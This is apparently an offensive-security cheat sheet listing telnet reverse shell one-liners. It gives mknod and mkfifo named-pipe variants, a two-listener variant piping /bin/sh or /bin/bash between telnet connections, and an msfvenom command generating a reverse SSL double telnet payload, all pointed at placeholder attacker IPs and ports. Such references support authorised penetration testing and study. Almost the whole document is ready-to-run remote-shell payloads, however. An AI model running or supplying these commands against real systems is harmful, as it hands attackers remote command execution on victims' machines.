# Telnet

## 01 - One-liners

### 1.1 - `mknod`

```
$ mknod backpipe p && telnet <attacker_IP> <attacker_PORT> 0<backpipe | /bin/bash 1>backpipe; rm -f backpipe
```

### 1.2 - `mkfifo`

```
$ mkfifo /tmp/f && telnet <attacker_IP> <attacker_PORT> 0</tmp/f | /bin/sh 1>/tmp/f; rm -f /tmp/f

$ TF=$(mktemp -u); mkfifo $TF && telnet <attacker_IP> <attacker_PORT> 0<$TF | /bin/sh 1>$TF; rm -f $TF
```

### 1.3 - Wacky

Open two listeners of `netcat`. The first port is for sending commands and the second is for the output.

```
$ telnet <attacker_IP> <attacker_PORT_1>  | /bin/sh | telnet <attacker_IP> <attacker_PORT_1>

$ telnet <attacker_IP> <attacker_PORT_1>  | /bin/bash | telnet <attacker_IP> <attacker_PORT_1>
```

## 02 - Generate via `msfvenom`

```
$ msfvenom -p cmd/unix/reverse_ssl_double_telnet handlersslcert=[/path/to/file.pem] sslversion=[Auto | TLS | SSL23 | SSL3 | TLS1 | TLS1.1 | TLS1.2] lhost=<IP> lport=<PORT>
```

---
## References

- [Hacktricks: Shells Linux](https://book.hacktricks.xyz/shells/shells/linux)

- [D4Vinci: One-Lin3r](https://github.com/D4Vinci/One-Lin3r)